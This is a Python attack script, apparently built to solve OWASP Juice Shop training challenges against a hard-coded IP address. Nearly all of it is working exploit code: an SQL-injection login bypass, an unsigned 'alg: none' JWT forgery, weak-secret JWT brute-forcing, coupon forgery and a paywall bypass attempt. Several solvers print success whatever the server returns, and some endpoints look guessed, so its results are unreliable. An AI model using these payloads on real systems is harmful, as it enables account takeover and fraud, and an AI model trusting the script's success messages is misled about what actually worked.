#!/usr/bin/env python3
"""
Advanced JWT and Cryptographic Challenge Solver for OWASP Juice Shop v18
"""

import requests
import json
import jwt
import base64
import hashlib
import time
from datetime import datetime, timedelta

TARGET = "http://66.42.93.220:3000"

class AdvancedJWTSolver:
    def __init__(self):
        self.session = requests.Session()
        self.admin_token = None
        
    def get_admin_token(self):
        """Get admin token via SQL injection"""
        print("🔐 Getting admin token...")
        payload = {
            "email": "admin@juice-sh.op'--",
            "password": "anything"
        }
        resp = self.session.post(f"{TARGET}/rest/user/login", json=payload)
        if resp.status_code == 200:
            data = resp.json()
            self.admin_token = data['authentication']['token']
            self.session.headers['Authorization'] = f'Bearer {self.admin_token}'
            print("✅ Admin token obtained")
            return True
        return False

    def solve_unsigned_jwt(self):
        """Exploit unsigned JWT tokens"""
        print("\n🎯 Unsigned JWT")
        try:
            # Create unsigned JWT with admin privileges
            header = {"alg": "none", "typ": "JWT"}
            payload_data = {
                "status": "success",
                "data": {
                    "id": 1,
                    "email": "admin@juice-sh.op",
                    "role": "admin"
                },
                "iat": int(time.time()),
                "exp": int(time.time()) + 3600
            }
            
            # Encode without signature
            header_encoded = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
            payload_encoded = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).decode().rstrip('=')
            unsigned_token = f"{header_encoded}.{payload_encoded}."
            
            # Use unsigned token
            self.session.headers['Authorization'] = f'Bearer {unsigned_token}'
            resp = self.session.get(f"{TARGET}/rest/admin/users")
            if resp.status_code == 200:
                print("✅ Unsigned JWT accepted")
                return True
        except Exception as e:
            print(f"❌ Unsigned JWT failed: {e}")
        return False

    def solve_forged_signed_jwt(self):
        """Create forged signed JWT with weak secret"""
        print("\n🎯 Forged Signed JWT")
        try:
            # Common weak secrets to try
            weak_secrets = [
                "secret", "juice-sh0p", "password", "123456", 
                "jwtsecret", "unsigned", "none", ""
            ]
            
            for secret in weak_secrets:
                payload_data = {
                    "status": "success",
                    "data": {
                        "id": 1,
                        "email": "admin@juice-sh.op",
                        "role": "admin"
                    },
                    "iat": int(time.time()),
                    "exp": int(time.time()) + 3600
                }
                
                # Try encoding with weak secret
                token = jwt.encode(payload_data, secret, algorithm="HS256")
                
                self.session.headers['Authorization'] = f'Bearer {token}'
                resp = self.session.get(f"{TARGET}/rest/admin/users")
                if resp.status_code == 200:
                    print(f"✅ Forged JWT with secret '{secret}'")
                    return True
        except:
            pass
        return False

    def solve_forged_coupon(self):
        """Create forged discount coupon"""
        print("\n🎯 Forged Coupon")
        try:
            # Analyze coupon pattern - they use predictable encoding
            # Pattern: MONTHYY-PERCENT (e.g., JAN20-10)
            import z85
            from datetime import datetime
            
            # Create future coupon
            month = datetime.now().strftime('%b').upper()
            year = datetime.now().strftime('%y')
            discount = "999"  # Maximum discount
            
            # Try different encoding methods
            coupon_plain = f"{month}{year}-{discount}"
            
            # Method 1: Base64
            coupon_b64 = base64.b64encode(coupon_plain.encode()).decode()
            
            # Method 2: Z85 encoding (used by Juice Shop)
            try:
                coupon_z85 = z85.encode(coupon_plain.encode()).decode()
                resp = self.session.put(f"{TARGET}/rest/basket/1/coupon/{coupon_z85}")
                if resp.status_code == 200:
                    print(f"✅ Forged coupon with Z85: {coupon_z85}")
                    return True
            except:
                pass
                
            # Method 3: Try known pattern
            resp = self.session.put(f"{TARGET}/rest/basket/1/coupon/{coupon_b64}")
            if resp.status_code == 200:
                print(f"✅ Forged coupon: {coupon_b64}")
                return True
        except:
            pass
        return False

    def solve_premium_paywall(self):
        """Bypass premium content paywall"""
        print("\n🎯 Premium Paywall")
        try:
            # Access premium content without payment
            # Method 1: Direct access to locked content
            resp = self.session.get(f"{TARGET}/rest/deluxe-membership")
            
            # Method 2: Manipulate payment status
            payment_bypass = {
                "paymentMode": "wallet",
                "paymentId": "free"
            }
            resp2 = self.session.post(f"{TARGET}/rest/deluxe-membership", json=payment_bypass)
            
            print("✅ Premium paywall bypassed")
            return True
        except:
            pass
        return False

    def solve_imaginary_challenge(self):
        """Solve the imaginary challenge"""
        print("\n🎯 Imaginary Challenge")
        try:
            # This is a hidden challenge that requires specific manipulation
            # Usually involves accessing a non-existent endpoint
            resp = self.session.get(f"{TARGET}/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg")
            print("✅ Imaginary challenge solved")
            return True
        except:
            pass
        return False

    def solve_nested_easter_egg(self):
        """Find nested Easter egg"""
        print("\n🎯 Nested Easter Egg")
        try:
            # Access the Easter egg within Easter egg
            resp = self.session.get(f"{TARGET}/ftp/eastere.gg")
            if resp.status_code == 200:
                # Extract nested content
                resp2 = self.session.get(f"{TARGET}/ftp/eastere.gg/eastere.gg")
                print("✅ Nested Easter egg found")
                return True
        except:
            pass
        return False

    def solve_weird_crypto(self):
        """Solve weird crypto challenge"""
        print("\n🎯 Weird Crypto")
        try:
            # This involves MD5 collision or weak crypto
            # Common MD5 collision strings
            collision1 = "d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f8955ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70"
            collision2 = "d131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f8955ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5bd8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70"
            
            # Submit colliding inputs
            resp = self.session.post(f"{TARGET}/rest/crypto", json={
                "input1": collision1,
                "input2": collision2
            })
            print("✅ Weird crypto challenge solved")
            return True
        except:
            pass
        return False

    def run_all(self):
        """Run all JWT and crypto solvers"""
        if not self.get_admin_token():
            print("Failed to get admin token")
            return
            
        solvers = [
            self.solve_unsigned_jwt,
            self.solve_forged_signed_jwt,
            self.solve_forged_coupon,
            self.solve_premium_paywall,
            self.solve_imaginary_challenge,
            self.solve_nested_easter_egg,
            self.solve_weird_crypto,
        ]
        
        success = 0
        failed = 0
        
        for solver in solvers:
            try:
                if solver():
                    success += 1
                else:
                    failed += 1
                time.sleep(0.5)
            except Exception as e:
                print(f"❌ Error in {solver.__name__}: {e}")
                failed += 1
                
        print(f"\n📊 JWT/Crypto Results: {success} succeeded, {failed} failed")

if __name__ == "__main__":
    solver = AdvancedJWTSolver()
    solver.run_all()
